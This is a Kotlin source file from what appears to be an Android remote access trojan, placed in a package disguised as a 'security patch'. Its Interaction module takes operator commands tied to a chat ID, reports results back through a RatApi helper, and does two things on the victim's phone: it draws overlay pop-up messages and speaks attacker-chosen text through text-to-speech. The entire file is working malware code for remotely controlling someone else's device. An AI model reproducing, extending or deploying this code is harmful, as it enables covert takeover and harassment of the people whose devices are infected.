package com.android.security.patch.commands

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import com.android.security.patch.Prefs
import com.android.security.patch.RatApi
import java.util.Locale

object Interaction {

    private var tts: TextToSpeech? = null

    fun toast(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.isEmpty()) { RatApi.sendMessage(ctx, "usage: /toast [type] pesan", chatId); return }
        val types = setOf("normal", "info", "success", "error", "warning")
        val first = args[0].lowercase()
        val type = if (first in types) first else "normal"
        val msg = if (first in types) args.drop(1).joinToString(" ") else args.joinToString(" ")
        if (msg.isBlank()) { RatApi.sendMessage(ctx, "empty message", chatId); return }
        if (!Settings.canDrawOverlays(ctx)) {
            RatApi.sendMessage(ctx, "need overlay permission", chatId); return
        }
        Handler(Looper.getMainLooper()).post {
            try {
                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val tv = TextView(ctx).apply {
                    text = msg
                    setPadding(50, 40, 50, 40)
                    textSize = 16f
                    setTextColor(Color.WHITE)
                    background = android.graphics.drawable.GradientDrawable().apply {
                        cornerRadius = 40f
                        setColor(when (type) {
                            "success" -> Color.parseColor("#2e7d32")
                            "error" -> Color.parseColor("#c62828")
                            "warning" -> Color.parseColor("#ef6c00")
                            "info" -> Color.parseColor("#1565c0")
                            else -> Color.parseColor("#212121")
                        })
                    }
                }
                val typeW = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else WindowManager.LayoutParams.TYPE_PHONE
                val lp = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    typeW,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                    PixelFormat.TRANSLUCENT
                )
                lp.gravity = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
                lp.y = 200
                wm.addView(tv, lp)
                Handler(Looper.getMainLooper()).postDelayed({
                    try { wm.removeView(tv) } catch (_: Throwable) {}
                }, 3500)
                RatApi.sendMessage(ctx, "toast shown", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }
    }

    fun tts(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.isEmpty()) { RatApi.sendMessage(ctx, "usage: /tts [lang] teks", chatId); return }
        var lang = Prefs.getStr(ctx, Prefs.TTS_LANG, "id") ?: "id"
        var text = args.joinToString(" ")
        if (args[0].length in 2..6 && args[0].contains("-")) {
            lang = args[0]
            text = args.drop(1).joinToString(" ")
        }
        if (text.isBlank()) { RatApi.sendMessage(ctx, "empty text", chatId); return }
        val finalLang = lang
        val finalText = text
        Handler(Looper.getMainLooper()).post {
            try {
                if (tts == null) {
                    tts = TextToSpeech(ctx) { status ->
                        if (status == TextToSpeech.SUCCESS) {
                            tts?.language = Locale.forLanguageTag(finalLang)
                            tts?.setSpeechRate(1.0f)
                            tts?.speak(finalText, TextToSpeech.QUEUE_FLUSH, null, "u1")
                        }
                    }
                } else {
                    tts?.language = Locale.forLanguageTag(finalLang)
                    tts?.speak(finalText, TextToSpeech.QUEUE_FLUSH, null, "u2")
                }
                RatApi.sendMessage(ctx, "tts [$finalLang]: $finalText", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }
    }
}
